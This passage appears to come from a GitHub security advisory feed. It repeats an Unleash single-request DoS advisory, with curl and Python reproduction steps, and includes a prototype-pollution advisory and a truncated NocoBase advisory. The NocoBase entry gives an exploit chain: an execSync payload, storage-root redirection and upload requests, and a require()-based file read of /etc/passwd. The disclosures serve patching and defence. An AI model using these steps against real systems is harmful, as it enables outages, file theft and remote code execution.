<h2 id="root-cause">Root cause</h2>
<p>On validation failure the error formatter serializes the raw offending request value with an unguarded <code>const youSent = JSON.stringify(propertyValue)</code> (<code>src/lib/error/bad-data-error.ts:75</code>), where <code>propertyValue</code> is read straight from the request body via <code>lodash.get</code> (<code>bad-data-error.ts:123</code>). A deeply-nested array or object makes <code>JSON.stringify</code> recurse once per level and throw <code>RangeError: Maximum call stack size exceeded</code>. <code>fromOpenApiValidationErrors</code> (<code>bad-data-error.ts:158</code>) runs from the Express error middleware <code>openAPIValidationMiddleware</code> (<code>src/lib/routes/controller.ts:68</code>), which calls it with no try/catch (<code>controller.ts:70</code>), while the controller's own try/catch (<code>controller.ts:103</code>) wraps only the route handler. The process registers only <code>process.on('unhandledRejection')</code> (<code>src/lib/server-impl.ts:274</code>) and no <code>uncaughtException</code> handler, so the synchronous throw terminates Node with <code>exit(1)</code>. The same unguarded pattern exists at <code>fromJoiError</code> (<code>bad-data-error.ts:175</code>) and at <code>handleErrors</code> (<code>src/lib/routes/util.ts:42</code>), whose own comment records that <code>JSON.stringify(finalError.details)</code> "also hangs" (<code>util.ts:63</code>).</p>
<h2 id="reproduction">Reproduction</h2>
<p><code>unleashorg/unleash-server:8.0.0</code> started from the repository <code>docker-compose.yml</code>, default config, no credentials, server at <code>http://localhost:4242</code>.</p>
<ol>
<li>A shallow body returns a normal 400 and the server stays up.</li>
</ol>
<pre><code>curl -s -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' -d '{"tokens":[[]]}'
# HTTP 400 BadDataError: "The `/body/tokens/0` property must be string. You sent []."
</code></pre>
<ol start="2">
<li>A single anonymous body nested 5000 levels deep (10013 bytes) crashes the process.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' \
  --data-binary "$(python3 -c 'd=5000;print("{\"tokens\":["+"["*d+"]"*d+"]}")')"
# 000  (connection dropped mid-response; Node exited)
</code></pre>
<ol start="3">
<li>The server is gone and does not recover on its own.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4242/health
# 000
docker inspect repo-web-1 --format '{{.State.Status}} restarts={{.RestartCount}}'
# exited restarts=0
</code></pre>
<p>Live-verified: one anonymous 10013-byte request to <code>/edge/validate</code> drove <code>/health</code> from 200 to 000; the container logs showed the <code>RangeError</code> stack through <code>bad-data-error</code> and <code>openAPIValidationMiddleware</code>, and the process did not restart. The crash threshold is about 4000 to 4500 nesting levels; depth 5000 crashes reliably. The same crash reproduces on <code>POST /edge/issue-token</code> with a nested object, confirming route and shape independence.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Single 10 KB request with no account, token, or cookie takes the entire server offline.</li>
<li>Replaying the request (kilobits per restart interval) sustains a near-total outage; with no restart policy the first request is a permanent kill.</li>
<li>Feature-flag evaluation sits on the request path of dependent applications, so the outage propagates to them.</li>
<li>Every OpenAPI-validated endpoint is a trigger, including anonymous ones.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://www.turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf">https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/advisories/GHSA-r5pq-6chh-j3xp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-21T19:14:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Unauthenticated single-request DoS via OpenAPI validation error formatter]]></title>
        <id>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</id>
        <link href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp"/>
        <updated>2026-08-21T19:14:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An unauthenticated <code>POST</code> to any OpenAPI-validated endpoint, including the anonymous <code>POST /edge/validate</code> and <code>POST /edge/issue-token</code>, crashes the entire Unleash server with one request body of deeply-nested JSON.</p>
<p>When request-body validation fails, Unleash builds the error message by calling <code>JSON.stringify</code> on the raw offending value taken from the request body. A value nested a few thousand levels deep makes <code>JSON.stringify</code> recurse past the V8 call-stack limit and throw <code>RangeError: Maximum call stack size exceeded</code>.</p>
<p>The throw is synchronous inside an Express error-handling middleware that has no try/catch, and the process registers no <code>uncaughtException</code> handler (only <code>unhandledRejection</code>). Node terminates the process with <code>exit(1)</code>.</p>
<p>The body parser sets no JSON nesting-depth limit, the payload (about 10 KB at depth 5000) stays far under the 100 KB body-size limit, and the same error formatter serves every API route, so the trigger is route-independent.</p>
<p>Result: a remote attacker with no account, token, or cookie takes the whole server offline with a single 10 KB request, and keeps it offline by replaying it.</p>
<h2 id="affected">Affected</h2>
<p>Unleash OSS server, confirmed live-exploitable on v8.0.0 (<code>unleashorg/unleash-server:8.0.0</code>).
Vulnerable code is the shared request-validation error path (<code>src/lib/error/bad-data-error.ts</code> <code>genericErrorMessage</code>), present on current <code>main</code>.
Reachable on a stock install: no feature flag, no setting, no authentication, no CSRF token, and no cookie required.
The 100 KB request-body size limit does not mitigate it; the crashing payload is about 10 KB.</p>
<h2 id="root-cause">Root cause</h2>
<p>On validation failure the error formatter serializes the raw offending request value with an unguarded <code>const youSent = JSON.stringify(propertyValue)</code> (<code>src/lib/error/bad-data-error.ts:75</code>), where <code>propertyValue</code> is read straight from the request body via <code>lodash.get</code> (<code>bad-data-error.ts:123</code>). A deeply-nested array or object makes <code>JSON.stringify</code> recurse once per level and throw <code>RangeError: Maximum call stack size exceeded</code>. <code>fromOpenApiValidationErrors</code> (<code>bad-data-error.ts:158</code>) runs from the Express error middleware <code>openAPIValidationMiddleware</code> (<code>src/lib/routes/controller.ts:68</code>), which calls it with no try/catch (<code>controller.ts:70</code>), while the controller's own try/catch (<code>controller.ts:103</code>) wraps only the route handler. The process registers only <code>process.on('unhandledRejection')</code> (<code>src/lib/server-impl.ts:274</code>) and no <code>uncaughtException</code> handler, so the synchronous throw terminates Node with <code>exit(1)</code>. The same unguarded pattern exists at <code>fromJoiError</code> (<code>bad-data-error.ts:175</code>) and at <code>handleErrors</code> (<code>src/lib/routes/util.ts:42</code>), whose own comment records that <code>JSON.stringify(finalError.details)</code> "also hangs" (<code>util.ts:63</code>).</p>
<h2 id="reproduction">Reproduction</h2>
<p><code>unleashorg/unleash-server:8.0.0</code> started from the repository <code>docker-compose.yml</code>, default config, no credentials, server at <code>http://localhost:4242</code>.</p>
<ol>
<li>A shallow body returns a normal 400 and the server stays up.</li>
</ol>
<pre><code>curl -s -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' -d '{"tokens":[[]]}'
# HTTP 400 BadDataError: "The `/body/tokens/0` property must be string. You sent []."
</code></pre>
<ol start="2">
<li>A single anonymous body nested 5000 levels deep (10013 bytes) crashes the process.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' \
  --data-binary "$(python3 -c 'd=5000;print("{\"tokens\":["+"["*d+"]"*d+"]}")')"
# 000  (connection dropped mid-response; Node exited)
</code></pre>
<ol start="3">
<li>The server is gone and does not recover on its own.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4242/health
# 000
docker inspect repo-web-1 --format '{{.State.Status}} restarts={{.RestartCount}}'
# exited restarts=0
</code></pre>
<p>Live-verified: one anonymous 10013-byte request to <code>/edge/validate</code> drove <code>/health</code> from 200 to 000; the container logs showed the <code>RangeError</code> stack through <code>bad-data-error</code> and <code>openAPIValidationMiddleware</code>, and the process did not restart. The crash threshold is about 4000 to 4500 nesting levels; depth 5000 crashes reliably. The same crash reproduces on <code>POST /edge/issue-token</code> with a nested object, confirming route and shape independence.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Single 10 KB request with no account, token, or cookie takes the entire server offline.</li>
<li>Replaying the request (kilobits per restart interval) sustains a near-total outage; with no restart policy the first request is a permanent kill.</li>
<li>Feature-flag evaluation sits on the request path of dependent applications, so the outage propagates to them.</li>
<li>Every OpenAPI-validated endpoint is a trigger, including anonymous ones.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://www.turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf">https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/advisories/GHSA-r5pq-6chh-j3xp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-21T19:14:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Unauthenticated single-request DoS via OpenAPI validation error formatter]]></title>
        <id>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</id>
        <link href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp"/>
        <updated>2026-08-21T19:14:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An unauthenticated <code>POST</code> to any OpenAPI-validated endpoint, including the anonymous <code>POST /edge/validate</code> and <code>POST /edge/issue-token</code>, crashes the entire Unleash server with one request body of deeply-nested JSON.</p>
<p>When request-body validation fails, Unleash builds the error message by calling <code>JSON.stringify</code> on the raw offending value taken from the request body. A value nested a few thousand levels deep makes <code>JSON.stringify</code> recurse past the V8 call-stack limit and throw <code>RangeError: Maximum call stack size exceeded</code>.</p>
<p>The throw is synchronous inside an Express error-handling middleware that has no try/catch, and the process registers no <code>uncaughtException</code> handler (only <code>unhandledRejection</code>). Node terminates the process with <code>exit(1)</code>.</p>
<p>The body parser sets no JSON nesting-depth limit, the payload (about 10 KB at depth 5000) stays far under the 100 KB body-size limit, and the same error formatter serves every API route, so the trigger is route-independent.</p>
<p>Result: a remote attacker with no account, token, or cookie takes the whole server offline with a single 10 KB request, and keeps it offline by replaying it.</p>
<h2 id="affected">Affected</h2>
<p>Unleash OSS server, confirmed live-exploitable on v8.0.0 (<code>unleashorg/unleash-server:8.0.0</code>).
Vulnerable code is the shared request-validation error path (<code>src/lib/error/bad-data-error.ts</code> <code>genericErrorMessage</code>), present on current <code>main</code>.
Reachable on a stock install: no feature flag, no setting, no authentication, no CSRF token, and no cookie required.
The 100 KB request-body size limit does not mitigate it; the crashing payload is about 10 KB.</p>
<h2 id="root-cause">Root cause</h2>
<p>On validation failure the error formatter serializes the raw offending request value with an unguarded <code>const youSent = JSON.stringify(propertyValue)</code> (<code>src/lib/error/bad-data-error.ts:75</code>), where <code>propertyValue</code> is read straight from the request body via <code>lodash.get</code> (<code>bad-data-error.ts:123</code>). A deeply-nested array or object makes <code>JSON.stringify</code> recurse once per level and throw <code>RangeError: Maximum call stack size exceeded</code>. <code>fromOpenApiValidationErrors</code> (<code>bad-data-error.ts:158</code>) runs from the Express error middleware <code>openAPIValidationMiddleware</code> (<code>src/lib/routes/controller.ts:68</code>), which calls it with no try/catch (<code>controller.ts:70</code>), while the controller's own try/catch (<code>controller.ts:103</code>) wraps only the route handler. The process registers only <code>process.on('unhandledRejection')</code> (<code>src/lib/server-impl.ts:274</code>) and no <code>uncaughtException</code> handler, so the synchronous throw terminates Node with <code>exit(1)</code>. The same unguarded pattern exists at <code>fromJoiError</code> (<code>bad-data-error.ts:175</code>) and at <code>handleErrors</code> (<code>src/lib/routes/util.ts:42</code>), whose own comment records that <code>JSON.stringify(finalError.details)</code> "also hangs" (<code>util.ts:63</code>).</p>
<h2 id="reproduction">Reproduction</h2>
<p><code>unleashorg/unleash-server:8.0.0</code> started from the repository <code>docker-compose.yml</code>, default config, no credentials, server at <code>http://localhost:4242</code>.</p>
<ol>
<li>A shallow body returns a normal 400 and the server stays up.</li>
</ol>
<pre><code>curl -s -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' -d '{"tokens":[[]]}'
# HTTP 400 BadDataError: "The `/body/tokens/0` property must be string. You sent []."
</code></pre>
<ol start="2">
<li>A single anonymous body nested 5000 levels deep (10013 bytes) crashes the process.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:4242/edge/validate \
  -H 'Content-Type: application/json' \
  --data-binary "$(python3 -c 'd=5000;print("{\"tokens\":["+"["*d+"]"*d+"]}")')"
# 000  (connection dropped mid-response; Node exited)
</code></pre>
<ol start="3">
<li>The server is gone and does not recover on its own.</li>
</ol>
<pre><code>curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4242/health
# 000
docker inspect repo-web-1 --format '{{.State.Status}} restarts={{.RestartCount}}'
# exited restarts=0
</code></pre>
<p>Live-verified: one anonymous 10013-byte request to <code>/edge/validate</code> drove <code>/health</code> from 200 to 000; the container logs showed the <code>RangeError</code> stack through <code>bad-data-error</code> and <code>openAPIValidationMiddleware</code>, and the process did not restart. The crash threshold is about 4000 to 4500 nesting levels; depth 5000 crashes reliably. The same crash reproduces on <code>POST /edge/issue-token</code> with a nested object, confirming route and shape independence.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>Single 10 KB request with no account, token, or cookie takes the entire server offline.</li>
<li>Replaying the request (kilobits per restart interval) sustains a near-total outage; with no restart policy the first request is a permanent kill.</li>
<li>Feature-flag evaluation sits on the request path of dependent applications, so the outage propagates to them.</li>
<li>Every OpenAPI-validated endpoint is a trigger, including anonymous ones.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Jan Kahmen, <a href="https://www.turingpoint.de">turingpoint</a> (<a href="mailto:jan@turingpoint.de">jan@turingpoint.de</a>)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/Unleash/unleash/security/advisories/GHSA-r5pq-6chh-j3xp</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf">https://github.com/Unleash/unleash/commit/b0e4da63249a9403bc209e0581db223326cb8dcf</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r5pq-6chh-j3xp">https://github.com/advisories/GHSA-r5pq-6chh-j3xp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5pq-6chh-j3xp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-21T19:14:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gettext-converter] gettext-converter: Prototype pollution in js2i18next() via crafted translation keys]]></title>
        <id>https://github.com/advisories/GHSA-f4jp-rw7w-ccwg</id>
        <link href="https://github.com/advisories/GHSA-f4jp-rw7w-ccwg"/>
        <updated>2026-08-20T20:11:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>js2i18next()</code> is vulnerable to prototype pollution. When converting translations, it splits nested keys on the key separator (default <code>##</code>) and uses each segment as a dynamic object key while building the output object. A key whose segment is <code>__proto__</code> (e.g. <code>__proto__##gcPolluted</code>) causes the converter to resolve <code>Object.prototype</code> as the nested write target and assign the translated value onto it, polluting <code>Object.prototype</code> for the whole runtime.</p>
<p>Any application that converts translation data (PO / i18next JS objects) originating from an untrusted or user-controlled source is affected. Prototype pollution can lead to denial of service and, depending on the surrounding application, may enable further attacks.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>gettext-converter@1.3.3</code>. Key segments equal to <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code> are now rejected before being used as dynamic object keys.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Upgrade to <code>1.3.3</code>. If upgrading is not immediately possible, sanitize/validate translation keys before passing them to <code>js2i18next()</code> and reject any key whose <code>##</code>-separated segments include <code>__proto__</code>, <code>constructor</code>, or <code>prototype</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/locize/gettext-converter/security/advisories/GHSA-f4jp-rw7w-ccwg">https://github.com/locize/gettext-converter/security/advisories/GHSA-f4jp-rw7w-ccwg</a></li>
<li><a href="https://github.com/locize/gettext-converter/issues/15">https://github.com/locize/gettext-converter/issues/15</a></li>
<li><a href="https://github.com/locize/gettext-converter/commit/df90c3b93e51faef68891d97b626544f619c5b31">https://github.com/locize/gettext-converter/commit/df90c3b93e51faef68891d97b626544f619c5b31</a></li>
<li><a href="https://github.com/locize/gettext-converter/releases/tag/v1.3.3">https://github.com/locize/gettext-converter/releases/tag/v1.3.3</a></li>
<li><a href="https://github.com/advisories/GHSA-f4jp-rw7w-ccwg">https://github.com/advisories/GHSA-f4jp-rw7w-ccwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4jp-rw7w-ccwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-20T20:11:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@nocobase/server] NocoBase: Arbitrary File Write chained with Local file Inclusion leads to Remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-ghvf-qf6h-g8x5</id>
        <link href="https://github.com/advisories/GHSA-ghvf-qf6h-g8x5"/>
        <updated>2026-08-20T18:42:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>Two vulnerabilities were identified and chained to achieve authenticated remote code execution</p>
<p>The first vulnerability allows any authenticated admin to redirect the file upload storage root to an arbitrary path on disk  including the application directory itself  by supplying an unsanitized <code>documentRoot</code> value to the <code>storages:update</code> API. The second vulnerability allows the same admin to trigger Node.js <code>require()</code> on any absolute filesystem path via the <code>pm:enable</code> plugin manager endpoint, which accepts user-supplied paths with no validation (Local File Inclusion).</p>
<p>Chained together, these two flaws allow an attacker with admin credentials to write a malicious file and have it trigger on the system achieving remote code execution.</p>
<p>A working proof-of-concept exploit chain was developed and verified, requiring only a valid admin session token.</p>
<h2 id="vuln-1-arbitrary-file-write-via-storagesupdate-documentroot-manipulation">VULN 1: Arbitrary File Write via <code>storages:update</code> documentRoot Manipulation</h2>
<h3 id="summary">Summary</h3>
<p>The file-manager plugin's storage update endpoint accepts an arbitrary <code>documentRoot</code> value without validation. An authenticated admin can overwrite a storage record's <code>documentRoot</code> to any absolute path on the filesystem, then upload files that land anywhere the Node.js process (root in default Docker deployments) can write  including the web root, the application source directory, or system paths.</p>
<h3 id="vulnerable-components">Vulnerable Components</h3>
<p><code>packages/plugins/@nocobase/plugin-file-manager/src/server/storages/local.ts</code> | <code>getDocumentRoot()</code> L24–27 |
<code>packages/plugins/@nocobase/plugin-file-manager/src/server/actions/attachments.ts</code> | <code>createMiddleware()</code> 
Server route: <code>POST /api/storages:update</code> 
Server route: <code>POST /api/attachments:upload</code> </p>
<h3 id="root-cause">Root Cause</h3>
<p><code>getDocumentRoot()</code> resolves the <code>documentRoot</code> field from the storage record:</p>
<pre><code class="language-javascript">// packages/plugins/@nocobase/plugin-file-manager/src/server/storages/local.ts
const { documentRoot = process.env.LOCAL_STORAGE_DEST || path.join(process.cwd(), 'storage', 'uploads') } =
  this.storage.options || {};

return path.resolve(path.isAbsolute(documentRoot) ? documentRoot : path.join(process.cwd(), documentRoot));
</code></pre>
<p><code>resolveSafePath()</code> is called during file upload to prevent filename traversal, but it uses the already-resolved (attacker-controlled) <code>documentRoot</code> as its safe root. There is <strong>no validation on the <code>documentRoot</code> value itself</strong> at creation or update time. An admin can set <code>documentRoot</code> to any path (<code>/</code>, <code>/etc</code>, <code>/var/www/html</code>, the app root) and the upload will write there.</p>
<p>The creation endpoint (<code>storages:create</code>) also accepts arbitrary <code>documentRoot</code>, but the <strong>update endpoint is worse</strong>: it silently replaces the root on an existing (potentially already-default) storage, bypassing any frontend guards.</p>
<h3 id="steps-to-reproduce">Steps to Reproduce</h3>
<p><strong>Prerequisites:</strong> Admin session token.</p>
<p><strong>Step 1  Get the local storage ID:</strong></p>
<pre><code class="language-bash">curl -s "http://192.168.228.130:13000/api/storages" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI"
</code></pre>
<p>Storage ID on this target: <code>366584416632832</code></p>
<p><strong>Step 2  Create the RCE payload:</strong></p>
<pre><code class="language-bash">cat &gt; /tmp/rce_proof.js &lt;&lt; 'EOF'
const { execSync } = require('child_process');
const fs = require('fs');
const out = execSync('id; whoami; hostname').toString();
fs.writeFileSync('/home/spooky/nocobase/storage/uploads/out.txt', out);
module.exports = {};
EOF
</code></pre>
<p><strong>Step 3  Redirect storage documentRoot to app CWD:</strong></p>
<pre><code class="language-bash">curl -s -X POST "http://192.168.228.130:13000/api/storages:update?filterByTk=366584416632832" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI" \
  -H "Content-Type: application/json" \
  -d '{"options":{"documentRoot":"."},"default":true}'
</code></pre>
<img width="826" height="304" alt="image" src="https://github.com/user-attachments/assets/808bf5cf-f6cc-4df6-9d94-b84cff1dcd66">

<p><strong>Step 4  upload the RCE payload:</strong></p>
<p>The payload writes output to the NocoBase uploads directory, which is served statically on port 13000</p>
<pre><code class="language-bash">curl -s -X POST "http://192.168.228.130:13000/api/attachments:upload" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInRlbXAiOnRydWUsImlhdCI6MTc3OTgzMTc1NCwic2lnbkluVGltZSI6MTc3OTgzMTc1NDE3MSwiZXhwIjoxNzc5OTE4MTU0LCJqdGkiOiJlZTJhMTU5Zi04MmE1LTQxZDctOTgyMC02ODlmOTM1Yjk2NWQifQ.Q_4m87ZDKI4bDW6QejoHYveGPNCaxzDJN-N_0B_pAfI" \
  -F "file=@/tmp/rce_proof.js;filename=rce_proof.js;type=application/javascript"
</code></pre>
<img width="826" height="322" alt="image" src="https://github.com/user-attachments/assets/146492ff-7eeb-4742-a13d-6bb3f9e0cd72">


<p><strong>Now that the file is uploaded successfully we can trigger the RCE with the LFI shown below</strong></p>
<h2 id="vuln-2-error-based-local-file-inclusion-via-pmenable-unsanitized-requiremodule-call">VULN 2: Error-Based Local File Inclusion via <code>pm:enable</code> Unsanitized <code>requireModule()</code> Call</h2>
<h3 id="overview">Overview</h3>
<p><code>pm:enable</code> passes <code>filterByTk</code> directly to <code>require()</code> with no path validation. This is a standalone LFI primitive with two modes:</p>
<ul>
<li><strong>Non-JS files</strong> (e.g. <code>/etc/passwd</code>): Node.js parses them as JavaScript, fails with a <code>SyntaxError</code> that embeds the file content in the error message. That error is written to <code>system_error_YYYY-MM-DD.log</code> and is downloadable via <code>logger:download</code> giving an attacker blind/error-based file read.</li>
<li><strong>JS files</strong> (e.g. an attacker-uploaded payload): the file executes as Node.js code in the server process  RCE. This is the second stage of the chain with VULN-01.</li>
</ul>
<h3 id="root-cause-1">Root Cause</h3>
<p>The <code>enable</code> action takes <code>filterByTk</code> from query params and passes it directly to the CLI runner with zero validation:</p>
<pre><code class="language-typescript">// packages/core/server/src/plugin-manager/options/resource.ts  L141-151
async enable(ctx, next) {
  const { filterByTk } = ctx.action.params;   // ← raw user input
  if (!filterByTk) {
    ctx.throw(400, 'plugin name invalid');
  }
  const keys = Array.isArray(filterByTk) ? filterByTk : [filterByTk];
  app.runAsCLI(['pm', 'enable', ...keys], { from: 'user' });  // ← no sanitization
  ctx.body = filterByTk;
  await next();
},
</code></pre>
<p>The CLI handler calls <code>requireModule(key)</code>:</p>
<pre><code class="language-typescript">// packages/core/utils/src/requireModule.ts
export function requireModule(m: any) {
  if (typeof m === 'string') {
    m = require(m);   // ← arbitrary file executed as Node.js module
  }
  if (typeof m !== 'object') { return m; }
  return m.__esModule ? m.default : m;
}
</code></pre>
<p><code>assertSafePluginPackageName()</code> exists in the codebase (validates against absolute paths and <code>..</code>) but is <strong>never invoked</strong> in the HTTP action path — only in storage directory helpers. The HTTP handler goes straight from user input → <code>require()</code>.</p>
<h3 id="steps-to-reproduce-error-based-file-read-standalone">Steps to Reproduce Error-Based File Read (Standalone)</h3>
<p><strong>Step 1  Trigger require() on any file:</strong></p>
<pre><code class="language-bash">curl -s "http://TARGET:13000/api/pm:enable?filterByTk=/etc/passwd" \
  -H "Authorization: Bearer TOKEN"
# Response: {"data":"/etc/passwd"} — 200 OK
</code></pre>
<p>Node.js attempts to parse <code>/etc/passwd</code> as a JavaScript module. It fails at the first <code>:</code> character with:</p>
<img width="2064" height="530" alt="image" src="https://github.com/user-attachments/assets/6aca1e88-a1c6-466a-8061-a0f3f7fbd4f8">

<p>and we see the error message after sending the request:</p>
<img width="1036" height="380" alt="image" src="https://github.com/user-attachments/assets/b8ddbf38-7de0-47ba-aa56-39ac4f2de400">

<p><strong>Step 2 navigate to the logger and download the system error log</strong></p>
<img width="1142" height="720" alt="image" src="https://github.com/user-attachments/assets/84103a14-99a6-4db0-bf86-35d5d09f730d">


<p>now when we extract the .tar file we can see proof of local file inclusion (partial in this response):</p>
<img width="1264" height="268" alt="image" src="https://github.com/user-attachments/assets/8f90ee8b-16d2-4bbf-8308-29ed80330ec8">

<h2 id="remote-code-execution">Remote code execution</h2>
<p>With our node js payload sitting at the web root all we must do now is use the local file inclusion in pm:enable to trigger it </p>
